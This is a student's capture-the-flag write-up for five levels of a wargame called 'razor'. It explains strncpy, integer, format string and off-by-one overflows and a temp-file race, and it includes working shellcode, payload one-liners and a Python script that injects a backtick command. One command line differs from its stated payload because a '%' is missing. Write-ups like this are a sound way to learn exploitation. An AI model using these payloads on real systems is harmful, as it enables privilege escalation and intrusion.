@@ -1,0 +1,126 @@
+Writeup for last 5 levels of razor done by Jack Blackburn
+I got help from Zack along the way, as well as a grad student I work with, Bashayer Alharbi.
+
+
+shellcode for l33t:
+
+sc = \
+"\xeb\x16\x5b\x31\xc0\x88\x43\x13\x89\x5b\x14\x89\x43" +\
+"\x18\xb0\x0b\x8d\x4b\x14\x8d\x53\x18\xcd\x80\xe8\xe5" +\
+"\xff\xff\xff/usr/local/bin/l33t/xAAAABBBB"
+
+
+
+Level 11:
+
+This level has a buffer overflow vulnerability due to improper use of strncpy, The writer of The
+code only intended to pass argv[1] to the checkpwd() function but due to the improper use of strncpy()
+argv[2] is appended to password and argv[1]+argv[2] is passed into the checkpwd() function. Thus when p is copied into
+mypwd we can keep writing to the stack eventually hitting the return address which I overwrote to jump to my shellcode which I placed 
+in my argv[1]. My argv[1] had a no-op sled of length 512-(shellcode length) then my shellcode and my argv[2] contained "abcdabcd"+"\x44\xa6\xff\xff" which was 
+printed via a python script. This ran l33t breaking the level.
+
+
+
+Level 12:
+
+This level involved an integer overflow exploit. The key was that a short was being used when checking the length of my 
+argv[1]. It was expecting a length of 256 or less which translated to 0x100. So as long as the length of my argv[1] had 0x0100 or less
+in the lower 4 bytes I could pass the check. I made my argv[1] 65535 bytes long which translates to 0x10000 which passes the check.
+So when we copy argv[1] into filename we can write past the buffer and overwrite max, then len, then f, then the ebp, and finally the return
+address. I placed my shellcode into my argv[1] with a no-op sled at the beginning and then at the end of the buffer I placed my shellcode for l33t.
+The script I used for my argv[1] is:
+#!/usr/bin/python
+
+sc = \
+"\xeb\x16\x5b\x31\xc0\x88\x43\x13\x89\x5b\x14\x89\x43" +\
+"\x18\xb0\x0b\x8d\x4b\x14\x8d\x53\x18\xcd\x80\xe8\xe5" +\
+"\xff\xff\xff/usr/local/bin/l33t/xAAAABBBB"
+
+print "\x90"*198+sc+"abcdabcdabcdabcd\xb8\xd4\xfe\xff"+"c"*65264;
+
+
+
+Level 13:
+
+This level is vulnerable to a format string attack at the fprintf(f, log_entry) statement in the 
+sudoexec function. In order to reach this statement we have to pass a fopen check looking for a sudolog file in the 
+current directory. So, to bypass this I created a file with the same name in my home directory and ran the program 
+from there. This allows me to pass the check. Now I can start to formulate my format string which I will place in my argv[1].
+So, to start I copied the binary into my home directory so I can do core dumps of the binary. Then I ran gdb on the file to determine
+the parameter offset, the address of my shellcode, and the return address of the function. To get the parameter offset I subtracted the address of where log_entry was
+stored from where it was placed on the stack and divided it by 4 to account for 4 byte addresses. I found that to be 70, but the first 4 bytes 
+of log_entry are not what I want, it has my uid there when I want it to write to the return address. So, in actuality what I wanted was 71 and 72 for the
+parameter offset.
+
+I also used gdb to find the address of my shellcode which I placed in my envirornment variables. My format string is broken down as follows
+".."(this is used to get byte address offset correct)"\x60\xad\xff\xff\x62\xad\xff\xff"(these are the bytes of the address I want to overwrite)
+"%53717x"(adds that many more bytes such that what is written to the return address is the lower 4 bytes of the address of my shellcode)"%71$hn"(This is what tells printf to write to the stack)
+"%11802x"(this writes ffff to the upper 4 bytes of the return address)"%72$hn"(This writes to the correct address).
+
+The entire string is as follows:
+
+"..\x60\xad\xff\xff\x62\xad\xff\xff%53717x%71$hn%11802x%72$hn"
+
+And the final command run from my home directory is:
+
+/home/jackblackburn/lev12 /var/challenge/level12/12 $(python -c 'print "..\x60\xad\xff\xff\x62\xad\xff\xff%53717x%71$hn11802x%72$hn"')
+
+Which runs l33t with privileges beating the level.
+
+
+
+Level 14:
+
+This level is the off-by-one buffer overflow vulnerability. In checkmsg it allows you to write to mymsg[256], which is one past the boundary of the array.
+After looking in gdb this byte turns out to be the lowest byte of the ebp. Thus we can change the frame once the function returns
+and after the second return we will jump to our shellcode which I placed in the environment. I found that using gdb. I placed the address to my
+shellcode repeatedly in the buffer such that as long as it jumps back to somewhere in my buffer it'll work. This was important because, the addresses kept moving 
+around and this gave me more space to hit.
+
+My final command looked like:
+
+./13 jackblackburn $(python -c 'print "\xf0\x38\xff\xff"*64')
+
+
+
+Level 15:
+
+
+This level only showed the binary of the file we wanted exploit, thus I used Gdb to piece together what was happening. The first important
+insight I discovered was a strcmp of argv[1] to the string "moresecrets". I was able to figure this out by seeing what was placed at the top of the stack
+right before the strcmp. So, after running the program again with that string as my argv[1] I noticed that it
+was creating a temp file, writing to it, closing it, sleeping, and unlinking it. But, it would only do this when I execed it from my home directory
+because I don't have priveleges to create a file in the level15 directory. So, I wrote a python script to get some insight into what it was
+doing. I would run it as soon as it was created and after messing around a bit I found it would run ls on whatever I put into it's first
+command line argument. I was soon able to get it to exec l33t with sgid privs by escaping the command line input with '`l33t`' as the first command 
+line arg while execing the temp file. 
+
+
+my script looked as follows:
+
+
+import subprocess
+import os
+import time
+
+pwd = "/home/jackblackburn/level15"
+
+#run the victim
+process = subprocess.Popen(["/var/challenge/level14/14", "moresecrets"])
+
+time.sleep(1)
+#wait for file to be created
+tempFile = ""
+
+#search for it 
+for f in os.listdir(pwd):
+#after seeing what is printed from the victim I could tell that the temp file always started with a "."
+    if f.startswith("."):
+        tempFile = f
+        print(tempFile)
+        process.kill()
+        break
+
+#exec it with '`l33t`' as the first arg
+os.system(pwd + "/" + tempFile + " '`l33t`'")
